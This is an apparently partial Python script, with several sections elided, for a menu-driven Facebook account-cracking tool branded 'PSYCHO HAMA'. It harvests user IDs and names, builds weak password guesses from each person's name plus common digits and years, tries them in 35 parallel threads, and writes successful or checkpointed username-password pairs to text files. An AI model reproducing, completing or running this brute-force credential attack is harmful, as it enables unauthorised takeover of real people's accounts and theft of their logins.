...
#    print('\033[1;32m┌───────────────────────────────────────────┐') 
    print('\033[1;32m \033[1;32m[01] \033[1;32m CRACK FILE  ')
...
#    print('\033[1;32m└────────────────────────────────────────────┘')
    print('')
    psy = input('\033[1;37m  \033[1;32m DONE  ')
    if psy in ('1', '01'):
        __crack__().plerr()
    if psy in ('2', '02'):
    ...
    if psy in ('0', '00'):
        exit('THANKS FOR USING PSYCHO ♧︎︎︎𝙷𝙰𝙼𝙰♧︎︎︎ TOOL')  
    else:
...
class __crack__:
	...
	def plerr(self):
		os.system("clear");print(banner)
		print('          \033[1;32m CRACK FILE KURDISH ')
#		print(50*"\033[1;97m_")
		try:
			self.apk = input("\033[1;37m \033[1;32m FILE DONE \033[1;31m : \033[1;32m ")
			print ('')
	...
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write(f"\r \x1b[1;97m\033[1;32m 𝙹𝙶❥︎𝙷𝙰𝙼𝙴 \033[1;32m {loop}➗{len(self.id)} \033[1;37m[\033[1;32m OK \033[1;32m] \033[1;32m[\033[1;32m{len(ok)}\033[1;32m]")
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			if 'c_user' in ses.cookies.get_dict():
				print('\r\033[1;37m[\033[1;32m♧︎︎︎𝙷𝙰𝙼𝙰♧︎︎︎-OK\033[1;37m]\033[1;32m %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('ok.txt','a').write('%s\n' % wrt)
				break
			elif 'checkpoint' in ses.cookies.get_dict():
				print('\r\033[1;31m[\033[1;30m♧︎︎︎𝙷𝙰𝙼𝙰♧︎︎︎-CP\033[1;31m]\033[1;30m %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
	...
	def __pler__(self):
		os.system("clear")
		print(banner)
		print ("\033[1;32m  [1] \033[1;32m METHOD FAST ")
#		print ("\033[1;37m [2] \033[1;36mMETHOD NORMEL ")
#		print ("\033[1;37m [3] \033[1;36mMETHOD MEDIUM ")
#		print(50*"\033[1;97m_")
		yan = input('\033[1;37m \033[1;32m DONE  \033[1;31m: \033[1;32m')
		if yan == '':
			print('\Choose Error ')
			exit()
		elif yan in ('1', '01'):
...
#			print('\033[1;37m[+]\033[1;33m File CLONING CP/OK IDS MIX ')
			print('\033[1;32m \033[1;32m  ID \033[1;91m  \033[1;32m%s ' % len(self.id))
			...
			with ThreadPoolExecutor(max_workers=35) as (_ngentot_gratis_):
				for yntkts in self.id:
					try:
						...
						xz = name.split(' ')
						if len(xz) == 1:
							pwx = [name, xz[0]+xz[0], xz[0]+"12", xz[0]+"1234", xz[0]+"12345", xz[0]+"123456", xz[0]+"123456789", xz[0]+"123321", xz[0]+"1221", xz[0]+"1122", xz[0]+"112233", xz[0]+"0750", xz[0]+"2005", xz[0]+"2004", xz[0]+"2003", xz[0]+"54321", xz[0]+"321", xz[0]+"4321"]
						elif len(xz) == 2:
							pwx = [name, xz[0]+xz[0], xz[0]+"12", xz[0]+"1234", xz[0]+"12345", xz[0]+"123456", xz[0]+"123456789", xz[0]+"123321", xz[0]+"1221", xz[0]+"1122", xz[0]+"112233", xz[0]+"0750", xz[0]+"2005", xz[0]+"2004", xz[0]+"2003", xz[0]+"54321", xz[0]+"321", xz[0]+"4321"]
						elif len(xz) == 3:
							pwx = [name, xz[0]+xz[0], xz[0]+"12", xz[0]+"1234", xz[0]+"12345", xz[0]+"123456", xz[0]+"123456789", xz[0]+"123321", xz[0]+"1221", xz[0]+"1122", xz[0]+"112233", xz[0]+"0750", xz[0]+"2005", xz[0]+"2004", xz[0]+"2003", xz[0]+"54321", xz[0]+"321", xz[0]+"4321"]
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				...
				try:
					...
					month = bulan_ttl[month].print('\r\033[1;91m[♧︎︎︎𝙷𝙰𝙼𝙰♧︎︎︎-CP] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
					wrt = '%s - %s - %s %s %s%s' % (user,pw,day,month,year,tahun(user))
					cp.append(wrt)
					open('♧︎︎︎𝙷𝙰𝙼𝙰♧︎︎︎_Cp.txt','a').write('%s\n' % wrt)
					break
				except (KeyError, IOError):
					month = ''
					day   = ''
					...
					pass
				print('\r\033[1;91m[♧︎︎︎𝙷𝙰𝙼𝙰♧︎︎︎-CP] %s | %s%s      ' % (user,pw,tahun(user)))
...
class __cracking__:
	...
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write(f"\r \x1b[1;97m[\033[1;36mAdi\033[1;37m] {loop}/{len(self.id)} \033[1;37m[\033[1;36m OK z\033[1;37m] \033[1;37m[\033[1;36m{len(ok)}\033[1;37m]")
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
        ...
        try:
            ...
            for inayat in rgq['data']:
                ...
                try:
                    ...
                    last_name = 'Khan'
                idsave.write(uids+'|'+first_name+' '+last_name+'\n')
            print('\033[1;97m  \033[1;32m 𝙹𝙶❥︎𝙷𝙰𝙼𝙴 \033[1;37m \033[1;36mSUCCESSFULL DUMP FROM\033[1;37m '+ids)
            idsave.close()
